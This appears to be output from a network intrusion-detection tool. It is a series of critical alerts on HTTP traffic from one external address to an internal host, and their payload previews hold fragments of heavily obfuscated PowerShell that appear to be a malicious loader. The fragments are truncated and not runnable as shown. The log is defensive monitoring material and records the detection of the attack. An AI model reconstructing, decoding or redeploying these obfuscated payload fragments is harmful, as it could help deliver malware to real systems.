🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.102379
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
-9425+(15679-6157)),(-6901+(283+(10530-(27004744/(-3059+(19071-(53281224/5988))))))),(-7857+7968),(8183-8069),(966000/8400))| bqentacmh { [char]$_ })))::Add(([system.String]::new(@((-6786+(14834-(26012826/3277))),(-9557+(18878-9208)),(735056/(8224-1661)),(412456/3784),(8355-(1835+(8439-(-1028+3055)))),(-2128+(-2707+4938)),(203616/(4952-(10722272/(-2878+6530)))),(-5680+5780),(-6598+6709),(-6115+6236),(279300/(5350-2900))))), [type](-join (@((8037-(6014+1924)),(-6016+6113),(-2821+2929),(-5883+(-35
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.104853
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
8947),(-5248+(24876045/(12380085/(4298-(12488852/7676))))),(673936/9232),(158004/(7764-(9818-4448))),(6243-(9804-(2176+1450))),(-2289+2392),(-6727+6800),(164511/2031),(3331-(23717692/7262)),(510082/6893),(401720/7304),(2169-2081),(-6077+6188),(3299-(30758049/(42791310/(-3002+7472)))),(5902-5829),(434280/(35755720/(67025920/(10013184/1476)))),(484484/(12644-6352)),(8228-(698+(3889+3558))),(-7932+(15620094/(-3320+5273))),(4927-4839),(132628/1868),(-4545+(20324588/4369)),(8879-8826),(-4230+(290+(18
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.106996
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
))),(-8684+(4128+4605)),(297288/(24724452/5988)),(7749-7659),(-2038+(2647750/(4297454/3449))),(505020/8860),(556750/6550),(252351/(10452-7903)),(837320/(13326-5714)),(2305-(-1563+(1052+(9339330/3421)))),(1118496/9168),(167100/1671),(5150-(3534+1549)),(-4774+4840),(6374-6297),(5869-5783),(149316/(-2867+5031)),(-2237+(-5313+(4833+2798))),(1080378/(11425-(14039928/6408))),(101486/1318),(565212/8436),(361790/5566),(-8079+(10441-(10155684/4466))),(-4477+4545),(-9268+(10654-1302)),(-2607+(-5467+8147))
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.108660
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
6/4928),(6307-(30353100/4876)),(891602/10018),(2684-(6883-(3193+1125))),(109410/(3975-2412)),(542230/8342),(8273-(2381+5803)),(-1886+1954),(696772/(17254-9152)),(-10127+10208),(5371-5290),(4985-(6560-(3994133/2431))),(-7884+(9724-(-2850+(7662-3040)))),(-3844+(6642-2733)),(85456/1744),(5214-(1394+3748)),(190890/2121),(-2337+2424),(511518/(4142+(-3602+(28557524/(7757-4371))))),(5183-5098),(4779-(23736960/5072)),(7092-6982),(330842/3847),(292190/(-3280+5675)),(255700/(-158+2715)),(285487/(6320-(806
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.110304
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
/(15001-9875)),(3638-(12645-(12615-(-3486+(14456-7429))))),(6999-6934),(10178-10075),(1794-(5030-3305)),(-6622+6687),(-5721+5838),(-5704+5807),(-5544+(12171-6548)),(9300-(5881+3348)),(223964/4307),(345840/(11810-(65631042/8766))),(210717/(15513814/8614)),(-8771+8840),(2559-2489),(-8688+(3034+5756)),(142354/1306),(-7431+(73589508/9756)),(886704/(6928+(-6423+(14941-(180+6218))))),(6292-(11607-(1324+(10149-6044)))),(-7831+(11491777/1453)),(-3986+(-4826+8895)),(-4776+4884),(-7296+(11153-(6311-2543))
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.112224
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
-5590+(1324+(10710-6357))),(807853/(7006+2071)),(1416-(10656-9358)),(-10046+(12951-2817)),(1499-1397),(4875-(8741-3940)),(6939-(14557-(-2477+10209))),(627980/(11536-4148)),(1673-1553),(5771-(10629618/1858)),(6461-6392),(-1817+(-5912+(57612192/7356))),(-9059+9129),(123120/1620),(504064/(14609-(65541780/7380))),(8365-(17009-(18724-10010))),(-4637+4748),(261348/2253),(546770/7811),(755810/6871),(1907-1831),(9293-9174),(-4953+(3908+1145)),(597800/8540),(557326/5687),(-6743+6827),(7646-7535),(10144-(
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.114279
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
(1821+(15343015/2767))),(2898-(12562244/4414)),(1078330/(12882-3079)),(6911-6827),(-7877+7946),(-8276+(16881-8516)),(1044182/8849),(4951-(-453+5287)),(-8882+(12641-(413+(31389220/9535)))),(10127-10010),(619551/(11372-2393)),(-2172+2244),(-4623+4677),(-6288+6404),(-6176+(53323480/8491)),(958512/(4193+(18533355/4397))),(-9423+9466),(137842/(6389481/3801)),(-5186+5286),(-9434+9553),(8038-(11609-3679)),(2751-(15665870/5885)),(169988/3269),(-6942+7045),(-7576+(-153+(75591425/(31931445/(-5196+(1954+(1
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.115980
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
7759-(12361-(-3132+(3793+(9103446/(19721097/8661)))))),(9389-9278),(-5256+(11255080/2120)),(2175-2123),(-2483+(-3331+5883)),(-5927+(-3460+9459)),(-5366+5413),(-7372+(14420-6967)),(-2107+2216),(375972/7372),(3810-3704),(-10154+(1319+8924)),(966438/9762),(1218-1119),(2334-2279),(8788-(1833+6906)),(-4746+4863),(-3179+(11898560/(15627690/(37177452/(5922+(-3870+(14640640/(9204-(362+(14458380/(10100-7910))))))))))),(189375/(3825-(7160-5860))),(-6572+(12025-5353)),(-4849+(21859774/(13581-(15412-(-2942+
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.117609
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
-(5859+(8542476/6516)))),(1066104/(11581-(-1615+(-4314+8398)))),(-2977+(11141-(5160+2916))),(2281-(5922-(4235640/1128))),(713574/8202),(972235/8035),(-9084+(24511464/(1035+1629))),(626142/9487),(7117-(14128-7085)),(9161-(56477600/6220)),(4246-4174),(-9838+(36257031/3659)),(213427/4541),(194464/1888),(-8442+(18689-10132)),(315882/2898),(5987-(311+5576)),(-2485+2574),(3921-3846),(3478-(5109-1739)),(689136/7032),(869490/(16551-(-859+7749))),(2268-2199),(462645/(13436-(74918067/7959))),(-3750+3839),
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.119962
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
7-2740),(9955-(55661040/5648)),(4007-3899),(501162/4962),(-2410+(4353900/1725)),(573066/4898),(3955-3890),(2472-2370),(1572-(9524-(16879-(12604-3784)))),(268716/3199),(4087-3981),(-6570+(8241-(13099944/(28098672/(23982392/7108))))),(159335/(-3567+6464)),(500528/(10315-(4003-(24537344/9344)))),(1407-(4857-3552)),(6586-6500),(-4448+4568),(-3170+3289),(-9132+(53554832/5801)),(129920/1624),(223740/(-2046+(16682292/3681))),(-7630+(1044+(-3256+9943))),(3386-(8592294/2622)),(9116-9049),(9017-(7678+(111
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.122445
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
844-(13864-5131)),(-2176+2275),(-9402+(4768+4735)),(9981-9892),(-9313+9381),(448450/(7148+(10900-9079))),(159654/2419),(417843/8193),(-2495+2602),(5673-(41751380/(16152-(4960+(32826680/(18592260/(-7811+(697+(17449-8253))))))))),(-8627+8702),(406196/(20569948/(12153-(5978+1668)))),(235055/(10122-5687)),(-5584+(8958-3254)),(-7743+(5770+(-6593+8638))),(465861/(1980+(-760+(42705326/(610+5532))))),(4516-4468),(8501-8384),(-3566+3633),(190960/(9741-6331)),(7979-7879),(2965-(15301000/(-912+6262))),(-26
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.124819
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
866-1815),(5721-(13423-7771)),(465394/(-152+(5952+4102))),(810390/9534),(-3765+(10168-(2785+(1381+(21529493/10103))))),(228976/(10322-7720)),(5260-(14269-9058)),(187589/1721),(-2658+2770),(-7007+(9427-(24002895/(4461+(13464-(77279950/9895)))))),(-9799+(69+(100288927/(5486+4707)))),(-3539+3616),(207440/2593),(5397-(24433800/(10115-5483))),(7647-7538),(-8471+(12504261/1463)),(115260/(-4563+(27241005/(-3747+(13161-(8565-(-5131+(67077666/(54338310/(16000-8655)))))))))),(461344/8872),(-1983+(-1532+35
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.126657
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
0/1340),(177030/2529),(8894-(2079+(13637-(8502-(13928706/(5475+(8645-(13876-8402)))))))),(574140/6835),(-3431+(-1310+4828)),(4959-(878+(-2884+(26226138/(-2545+(18824256/(26418132/(18308-(4702+(13918-(2761+6443))))))))))),(-5098+(2376+(-2779+(25904060/(10525-5891))))),(9941-9824),(4987-4907),(592703/7141),(2664-2545),(-6108+6182),(-1909+(-1387+3416)),(2900-2792),(2207-2159),(-2064+2162),(-9099+(660+(2776+(55517010/9615)))),(321604/3034),(215717/2599),(2174-2084),(413107/(-1612+(11771-(41413500/92
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.128348
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
/7395),(452232/6281),(-6787+(15569-(17405-(10697-(5912290/2971))))),(-7007+(1894+(-3261+8427))),(-9178+9251),(4765-(14220-9506)),(4898-(-784+5568)),(129864/1546),(9165-(11540-(6793850/2773))),(7451-7342),(-8481+8583),(-5347+(11965-6562)),(5101-4988),(-4989+5074),(6256-6153),(8016-(33083124/4174)),(695466/(9880-(12216654/(13170-(-5165+8894))))),(-2922+(5463-2451)),(5485-(15405-(1993+8010))),(7209-7140),(-9805+9885),(6016-5937),(8214-(42189620/(-2331+(14896-7382)))),(-5537+5659),(665805/(1985+(647
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.129932
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
8101860/(6963-(25195674/7642)))),(4245-4124),(884976/(5693+2899)),(-9935+(12310-2272)),(815031/6849),(168636/(9958172/(280+4326))),(2210-2109),(-4086+4140),(-10017+(36955422/(11388-7737))),(214812/(-2374+(10558552/(6062-4003)))),(5319-(24735062/4754)),(6211-(13577-7456)),(8490-(740+(14069-6392))),(7246-(4485+(26827227/(3614+(27451485/(15962805/(-1812+5469))))))),(1594-1489),(-8012+8088),(343896/4094),(9889-(88856816/9032)),(-2254+2363),(2584-(-3044+(20305424/(6690-(22730728/7492))))),(-7095+(928
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.131807
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
00+7986),(-2118+(4771800/(11291814/5206))),(267840/(7438140/(3167-(7939386/4329)))),(4726-4647),(5316-(337+4913)),(-2020+(-3816+5902)),(596745/6705),(-7667+(15154-(1939+(-4545+(14530-4506))))),(319550/(2600+(-1419+3384))),(6008-5936),(-1119+1175),(814509/(65664540/(18034-10214))),(-6675+(9317-(650+1921))),(10202-10080),(274284/2406),(975623/8063),(7843-7726),(5853-(-4249+9983)),(574376/(8614-(578+2668))),(509427/7383),(469170/5213),(-5772+(7783-1955)),(433086/4978),(57928/1114),(239120/(48155840
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.133628
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
3+9544)),(4230-4140),(9979-(16984-(9374-(5138448/(7420-5182))))),(8205-8101),(-8863+8981),(-3703+3802),(8899-8821),(224835/3459),(-3412+3493),(-2437+2506),(475800/6100),(-6184+(5137+(-3930+(11018-(-559+6534))))),(4823-(28494678/6009)),(7454-(1768+5621)),(-9183+(5821+3430)),(9204-(8002+1099)),(289224/(5518-2710)),(-4627+(8234400/(9588-(17920-10084)))),(-4519+(22131795/4827)),(-5459+(-687+(10670498/1718))),(-1028+1101),(-7046+7132),(-7901+(58349304/(17088-(2326+7428)))),(874448/10168),(862393/(931
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.136509
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
40),(-1374+(7408-5934)),(-8623+8696),(9787-9680),(382194/(13874-6380)),(-9956+(75335330/7511)),(-8717+(10757-1966)),(4052-3939),(-7734+(73414320/9345)),(4774-4691),(-4166+4288),(-1449+1558),(457050/4155),(-4039+4109),(6017-5946),(-2692+2757),(1591-(10491-(19068555/(18053976/(70628648/8321))))),(333450/(887+(9916-4953))),(292128/(18160624/(14714104/4931))),(207072/2876),(8213-8161),(-3888+(-2381+6356)),(8307-(10810-(11179-(12000-(13476436/3959))))),(3645-3590),(266461/2587),(-1735+(17926272/(1544
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.139137
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
927+(12189-(8777-1509)))),(-9694+(1920+(57306641/7303))),(10224-10149),(408859/(18310801/5419)),(7640-7533),(453300/(13383-4317)),(-1624+(-4708+6412)),(187768/(4747848/1416)),(2627-(18512618/7181)),(311989/3089),(-9606+(14224-(7885306/(4733-2995)))),(-6918+(11131590/1590)),(-3513+3612),(453708/8402),(-1231+1347),(8557-(2664+(14252-8442))),(342320/(12189-(2963+6114))),(7927-7815),(5353-5281),(-7866+(56854926/7122)),(-1425+1543),(4871-4765),(2562-2513),(-8964+(2654+(11034-4642))),(-4851+(-199+5119
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.142470
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
0/9124)),(-1159+1264),(5685-5608),(-2914+(25390017/8523)),(8059-(10564-(6472500/(-2609+5109)))),(694627/8369),(-10065+(19343704/(12751128/6669))),(5341-(-3320+8558)),(-2164+(947+(6398117/(26659622/(-4108+9654))))),(189255/(-2879+(29443032/(57068355/(1755+7130))))),(843228/7146),(-9107+9211),(-5439+(9933-4406)),(3683-3596),(8709-8619),(-7820+7867),(-4827+4932),(170400/(9181-5631)),(5803-(-1232+6933)),(8976-(60533253/(1592+(-1811+7006)))),(10139-10021),(-7915+(338+(13887-6225))),(7649-7537),(-8671
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.143925
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
(16317-(55800868/7004))))),(921250/(28424750/3394)),(5042-4938),(1506-1408),(1468-1346),(-6944+7047),(721800/(1349+(17002-(56633452/(30262098/(13106754/(5349936/(5621-3805)))))))),(443850/(5272+(26695718/(18997-9456)))),(-9818+9929),(5899-(-3485+(7667+(-68+(11138-(19573-10154)))))),(1144416/10218),(231392/(4101-(11710-(6347+(10786-(3070+(42721568/9736))))))),(216920/(25660360/8044)),(-7332+7381),(1258-(-6962+(18278-10135))),(5515-(3114+2292)),(4755-(-4128+(89848650/(7+10238)))),(-1332+1419),(483
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.145937
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
8714+8780),(3811-3709),(136320/(10150-7310)),(369915/5691),(59874/(11745870/(29584785/2957))),(-6207+(-2701+(4039+(11777-(51433065/(14577-7074)))))),(6112-(2223+3839)),(8123-8073),(8591-8484),(-8786+(13450-4588)),(413308/(15107120/4240)),(369072/(38215728/(9848-3014))),(690690/(58702072/(17279-(-1229+9584)))),(-3804+3922),(1251-1144),(-5102+(-3684+(11044-(9382984/(23163972/(20035011/(2158+(6764625/4295)))))))),(-2342+2408),(758912/(54540024/8049)),(3425-(922+2449)),(5733-5619),(153476/(8793760/4
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.147787
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
37+(6847-5577))),(-5645+5728),(436712/(43958656/(14598-6646))),(-3611+(638+3045)),(5558-5445),(1914-1798),(4664-(-181+4725)),(-4695+4799),(187862/(-92+2470)),(5355-5298),(-7418+(1955+(13262-(17150-(57048119/(14420-(16972-8601))))))),(853412/7357),(265795/(-4690+7817)),(4771-(26237736/5628)),(-6797+6915),(846504/7838),(5958-5838),(6032-(33268251/5613)),(5567-(14113-8668)),(5821-(17+(15294-9601))),(8045-7960),(1742-(9305944/(35889630/6510))),(-4728+4811),(699031/6533),(384111/3283),(5389-5319),(18
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.151167
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
161950/(3697+(7951-(9277-5992))))),(-9777+9851),(-5088+(14579-9369)),(394130/3583),(183456/2184),(-4255+4369),(498239/(10736-(11198-(-704+5737)))),(670236/8484),(209644/(11540-(35054265/(-4930+(17079-(38211096/(1066+3708))))))),(8091-(-791+(612+8196))),(3736-(29363750/(-1515+(18673-(17188-8155))))),(3720-3671),(129864/(20207766/8714)),(3810-3734),(581188/(10104-(46460192/(69417680/(71884660/(78619436/(16999640/2180))))))),(719831/6049),(397872/4912),(-8995+(13346-(7052-(-5148+7956)))),(6245-(-15
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.154237
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
5571+(-4455+(530+9605))),(5438-(-2374+7737)),(731640/7035),(-6787+6901),(7010-6899),(217120/(6712-(435+(28230048/6432)))),(-5637+(31907952/5592)),(-3704+3789),(604266/7747),(5703-(13997-8368)),(209682/2118),(3022-2902),(8858-8775),(895440/8528),(-8152+(80917557/(3214+6593))),(8255-(11531-(7803-4471))),(3404-(15389385/(10790-6203))),(10103-10032),(449826/6162),(-1311+1411),(-4620+4735),(-8761+(85325724/9684)),(127790/1966),(126360/(4169-2414)),(402948/7749),(581916/(777+(46353912/(261+(-4150+1013
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.157100
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
5327-(5130-(-6232+(48690576/(20449341/3501)))))),(4882-(-3054+(13945-6115))),(624585/(12803-3194)),(490450/(96863875/(16410-(-2551+9086)))),(680100/(41445294/(-1049+(72565737/(99395656/9784))))),(245000/(6879-(32763678/(15983-8501)))),(2834-2755),(566145/4923),(8472-(47921328/(2710+3014))),(-4517+(6311-1719)),(403722/(-1509+(33667262/6026))),(485109/(9178-(4820-(-6335+(62055140/(4316+(8924706/2569))))))),(-2770+(7144-4292)),(-2823+2902),(9299-9225),(-9831+(101009090/(27461655/(4442841/1651)))),(
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.159762
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
(14962-4767))),(163310/2333),(4608-4556),(5784-5714),(113734/1558),(-1751+(-7573+9397)),(-1812+1933),(92600/(-995+(80+(9327-6560)))),(641410/(14349-(11064-(12701-(-999+7822))))),(887337/8963),(7320-7241),(6036-5964),(-6746+6836),(3328-(-6626+(3521+(53799321/8471)))),(7147-7063),(-1990+(4120-2082)),(-5040+(9668-4577)),(152928/2832),(6488-(822+5566)),(-4403+(13343-8874)),(-2837+2884),(-10163+(5037+5176)),(-2301+2377),(5491-(33170490/(26493153/(7038249/1641)))),(-2396+2447),(397380/(8096-(11457378/
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.162496
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
806+4086)),(393666/(9472-(28758075/6499))),(778522/8026),(-1904+2016),(2895-(6191-(5074-(7145502/4186)))),(-3225+3277),(401240/5732),(-7405+7456),(-7873+7940),(3879-3758),(-2212+2316),(115233/1623))| lvtajydm { [char]$_ })); static $helvkma = (-1775+1779); static $txlovdphrmiz = [tdseonqk]::((-join (@((-9914+(46601576/4649)),(3127-(9775-6749)),(793730/(15341000/2300)))| ForEach-Object { [char]$_ })))($helvkma); static $udlktqrnmcah = (9508-9508); static $lqrhxnicdoyejw = (-2928+2928); static $ve
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.165027
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
)),(263585/(8928665/(-4104+8135)))))))([lfxmobgsnqp]::(([char[]]@((4927-(-4779+9626)),(816643/(10323-1904)),(-3575+3689),(880900/(8778360/(4694-(8602-(14938-9884))))),(-10078+10179)) -join ''))($global:mdtgwnxlu.([char[]]@((5188-(1861+(11269-8047))),(3186-3076),(-4151+4269),(5300-(41667670/(5423+(11083-8476)))),(4292-4185),(10219-(12028-(8686-(18837280/(-3900+(63052520/(37963658/4022))))))),(592218/5982),(-6968+(16154-(44649000/(12179-7259)))),(1009667/(8029+(4957-(13369-9646)))),(-5167+(-3650+8
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.167721
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
420-(10586-(22122109/(7349-3160)))),(-2639+2754),(6101-6031),(321943/(-4324+(11582-(10539-6600)))),(1694-(11695715/7379)),(-2918+(5841-(5094944/1808))),(689472/6384),(902660/(21365440/2864)))| qjbgnurvax { [char]$_ })), ([efhniujbapg]::((-join (@((-2497+2607),(900819/8919),(6873-6754))| ForEach-Object { [char]$_ })))(@((9195-(-1004+10126)),(7990-7880),(9059-8943),(561459/(6830-(4515863/3553))),(10112-(45430912/4544)),(3111-3033),(2477-(15320448/6448)),(429084/3699),(-1461+(-8625+10205)),(307914/
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.170015
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
90)),(4705-(7953-3359)),(-6064+6163),(9659-9552),(981922/(18594-8872)),(6274-6158),(-6523+6607),(1501-(-841+(-4848+(-2051+(11528-(17467632/7254)))))),(3025-2913),(365620/(1717+(-2703+(9922-(-1153+(-733+7202))))))))), ([efhniujbapg]::((-join (@((732600/(-247+(33699253/(-3443+(6758+1564))))),(323705/(10930-(4484+(392+(5218-(8265-(24315104/(676+3448)))))))),(-1659+(16469614/(67953368/(9441-(3542-(2757603/1919)))))))| ForEach-Object { [char]$_ })))(@((1678-(-8502+(81432305/(484+
1000
7581)))),(-74
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.172498
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
5/7411)),(-4737+(26846796/(12651-7119))),(-8895+(80324514/(82277775/(70414425/7633)))),(-5360+(-1228+(13098-(28278921/(1533+2878))))),(199800/(-7263+9063)),(3563-(4683-(6053-(34247850/(2939+(11507-7348)))))),(429828/5117),(-2854+2975),(-7854+(73096016/9176)),(9677-9576))| pteschvmlowq { [char]$_ })), (-join (@((4224-4140),(-5493+(-3551+(5288+(567+(6814-(26843438/(14591-(-721+7699)))))))),(-7415+(17296-9769)))| keoqsdcuty { [char]$_ })))); { cfumnsti fwicbnlh (-4207+(-4302+(61342353/(5358+1809)))
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.174035
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
))),(1078010/(17026-7136)),(401074/8719),(-9759+9837),(6971-6870),(1041332/(83144974/9262)),(5508-5462),(497751/(7824-1827)),(879897/(16570-(28668831/3317))),(541926/(15361-9887)),(-2027+(11971-9837)),(305121/(9467-6446)),(6674-(11255-(18233754/(-4633+(75127845/(1315+7508)))))),(10104-9989),(4049-4003),(5553-5470),(2512-2401),(539649/(-4509+9960)),(-3627+(12858-(61851596/(-2357+9136)))),(2844-(8742-5999)),(277936/(6429-4033)),(474869/(41614153/6923)),(491232/4386),(-9400+9516),(1020495/9719),(29
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.175491
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
